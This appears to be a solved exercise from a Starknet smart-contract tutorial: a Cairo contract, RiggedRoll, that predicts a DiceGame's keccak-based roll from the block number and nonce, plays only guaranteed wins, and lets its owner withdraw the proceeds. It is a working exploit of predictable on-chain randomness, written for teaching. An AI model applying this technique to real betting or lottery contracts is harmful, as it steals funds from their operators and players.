use contracts::DiceGame::{IDiceGameDispatcher, IDiceGameDispatcherTrait};
use starknet::ContractAddress;

#[starknet::interface]
pub trait IRiggedRoll<T> {
    fn rigged_roll(ref self: T, amount: u256);
    fn withdraw(ref self: T, to: ContractAddress, amount: u256);
    fn last_dice_value(self: @T) -> u256;
    fn predicted_roll(self: @T) -> u256;
    fn dice_game_dispatcher(self: @T) -> IDiceGameDispatcher;
}

#[starknet::contract]
mod RiggedRoll {
    use keccak::keccak_u256s_le_inputs;
    use openzeppelin_access::ownable::OwnableComponent;
    use openzeppelin_token::erc20::interface::IERC20CamelDispatcherTrait;
    use starknet::{ContractAddress, get_contract_address, get_block_number, get_caller_address};
    use super::{IDiceGameDispatcher, IDiceGameDispatcherTrait};

    component!(path: OwnableComponent, storage: ownable, event: OwnableEvent);

    #[abi(embed_v0)]
    impl OwnableImpl = OwnableComponent::OwnableImpl<ContractState>;

    impl OwnableInternalImpl = OwnableComponent::InternalImpl<ContractState>;

    #[storage]
    struct Storage {
        dice_game: IDiceGameDispatcher,
        #[substorage(v0)]
        ownable: OwnableComponent::Storage,
        predicted_roll: u256
    }

    #[event]
    #[derive(Drop, starknet::Event)]
    enum Event {
        #[flat]
        OwnableEvent: OwnableComponent::Event
    }

    #[constructor]
    fn constructor(
        ref self: ContractState, dice_game_address: ContractAddress, owner: ContractAddress
    ) {
        self.dice_game.write(IDiceGameDispatcher { contract_address: dice_game_address });
        self.ownable.initializer(owner);
    }

    #[abi(embed_v0)]
    impl RiggedRollImpl of super::IRiggedRoll<ContractState> {
        // ToDo Checkpoint 2: Implement the rigged_roll() function to predict the randomness in
        // the DiceGame contract and only initiate a roll when it guarantees a win.
        fn rigged_roll(ref self: ContractState, amount: u256) {
            let caller = get_caller_address();

            let dice_nonce = self.dice_game.read().nonce(); // read the current nonce from DiceGame
            let block_num = get_block_number().into();
            let prev_block = block_num - 1_u256;

            // Build the array for keccak
            let inputs = array![prev_block, dice_nonce];
            let predicted_roll = keccak_u256s_le_inputs(inputs.span()) % 16_u256;

            self.predicted_roll.write(predicted_roll);

            if predicted_roll <= 5_u256 {
                self.dice_game.read().roll_dice(amount);
            } else {
                panic!("Not a guaranteed winning roll. Aborting!");
            }
        }

        // ToDo Checkpoint 3: Implement the withdraw function to transfer Ether from the rigged
        // contract to a specified address.
        fn withdraw(ref self: ContractState, to: ContractAddress, amount: u256) {
            let caller = get_caller_address();
            let actual_owner = self.owner();
            assert!(caller == actual_owner, "Only the owner can call this function!");

            // 1. Get the DiceGame's ETH dispatcher
            let dice_game_dispatcher = self.dice_game.read();
            let eth_token_dispatcher = dice_game_dispatcher.eth_token_dispatcher();

            // 2. Check the RiggedRoll contract's balance of that token
            let contract_balance = eth_token_dispatcher.balanceOf(get_contract_address());
            assert!(contract_balance >= amount, "Not enough balance to withdraw");

            // 3. Transfer from RiggedRoll to to
            eth_token_dispatcher.transfer(to, amount);
        }

        fn last_dice_value(self: @ContractState) -> u256 {
            self.dice_game.read().last_dice_value()
        }
        fn predicted_roll(self: @ContractState) -> u256 {
            self.predicted_roll.read()
        }
        fn dice_game_dispatcher(self: @ContractState) -> IDiceGameDispatcher {
            self.dice_game.read()
        }
    }
}
